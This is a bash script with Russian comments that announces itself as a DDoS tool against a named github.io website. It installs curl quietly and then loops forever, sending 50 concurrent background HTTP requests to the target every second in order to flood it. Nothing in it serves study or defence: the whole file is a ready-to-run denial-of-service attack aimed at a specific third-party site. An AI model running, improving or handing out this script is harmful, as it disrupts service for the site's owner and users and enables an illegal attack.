#!/bin/bash

# Обновляем систему и ставим curl (если вдруг нет)
apt-get update -qq > /dev/null 2>&1
apt-get install -y curl > /dev/null 2>&1

TARGET="https://srabakio.github.io/"
CONCURRENCY=50

echo "[*] Starting DDoS on $TARGET"
echo "[*] Threads: $CONCURRENCY"

# Запускаем бесконечный цикл запросов
while true; do
    for i in $(seq 1 $CONCURRENCY); do
        curl -s -o /dev/null -w "%{http_code}" "$TARGET" &
    done
    # Ждем завершения всех фоновых процессов перед новым циклом (опционально, можно убрать для максимальной скорости)
    wait
    sleep 1
done
